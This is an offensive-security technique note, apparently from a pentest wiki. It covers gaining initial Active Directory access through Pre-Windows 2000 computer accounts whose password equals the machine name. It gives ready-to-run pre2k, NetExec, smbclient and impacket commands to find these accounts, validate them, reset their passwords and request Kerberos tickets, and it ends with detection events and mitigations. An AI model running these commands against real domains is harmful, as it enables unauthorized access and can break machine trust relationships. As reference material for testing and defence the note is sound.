---
tags:
  - "#type/technique"
  - "#tactic/TA0001"
  - "#technique/T1078"
  - "#stage/initial-access"
  - "#os/windows"
  - "#protocol/smb"
  - privileges/unauthenticated
aliases:
  - Pre-Windows 2000 Computers
  - Legacy Windows Authentication
  - Anonymous Authentication
  - Machine Account Abuse
---
**Tools:** [pre2k](https://github.com/garrettfoster13/pre2k), [nxc](https://github.com/Pennyw0rth/NetExec)
## Technique
___
Pre-Windows 2000 compatibility refers to a legacy configuration setting in Active Directory that can introduce security vulnerabilities. When enabled, this setting adds the "Everyone" security principal to the "Authenticated Users" group, potentially granting anonymous users more access than intended.

Additionally, computer accounts that were created with Pre-Windows 2000 compatibility or that have never had their passwords reset may be vulnerable to authentication attacks. These accounts can typically be identified by their password last set date being 12/31/1600.

This technique allows attackers to authenticate as these vulnerable computer accounts using their machine name as the password, providing an initial foothold in the domain without requiring valid user credentials.

## Prerequisites
___
- Network access to a domain controller
- Knowledge of domain computer names (can be obtained through various enumeration techniques)
- No valid credentials are required for exploitation in most cases

## Execution
___
### Identify

**With creds**
```bash
pre2k auth -u <user> -d <DOMAIN> -p <pass> -dc-ip <dcip> -ldaps -save
```
or
```bash
nxc ldap <dc-ip> -u 'user' -p 'pass' -M pre2k
```

**Without creds**
```bash
pre2k unauth -d <DOMAIN> -dc-ip <dcip> -inputfile <listofcomputers> -save
```

> [!NOTE]
You can pass `-n` to check blank passwords as well

> [!NOTE]
Without using the tool, you can check by identifying `pwdlastset: 12/31/1600 7:00:00PM`

> [!NOTE]
The only error that indicates an auth failure is `KDC_ERR_PREAUTH_FAILED` other errors do not mean you can't authenticate

**Validate**

```bash
smbclient domain/machinename\$:machinename@dc-ip
```
Expected output: `STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT`

### Exploit

### Option 1: Change password

> [!NOTE]
This is semi-destructive, you're changing the machine password, may require the object be rejoined to the domain


**Change the account password:**
```bash
impacket-changpasswd.py domain/machinename\$:machinename@dc-ip -newpass <pass>
```
or
```bash
nxc smb <dcip> -u machinename$ -p 'machinename' -M change-password -o NEWPASS=NewPassword
```

### Option 2: Use kerberos auth

No need to change the password if you use kerberos auth!

```bash
nxc smb <ip> -u machinename$ -p machinename -k
```

Grab the tgt for use with other tools.
```bash
nxc smb <ip> -u machinename$ -p machinename -k --generate-tgt ticket
```

## Detection & Mitigation
___

### Detection

- Monitor for authentication attempts using computer account names with the same password as the computer name
- Look for Event ID 4768 (Kerberos TGT Request) for computer accounts from unusual sources
- Monitor for changes to computer account passwords (Event ID 4742)
- Scan domain for computer accounts with old password last set dates (especially 12/31/1600)

### Mitigation

- Disable the "Allow anonymous access to Active Directory" or "Pre-Windows 2000 Compatible Access" group in the domain
- Regularly reset computer account passwords using standard domain maintenance procedures
- Implement strong account management policies
- Consider using a Privileged Access Management (PAM) solution to control access to sensitive accounts
- Use tools like [AD-Control-Paths](https://github.com/ANSSI-FR/AD-control-paths) to identify and remediate insecure ACL configurations
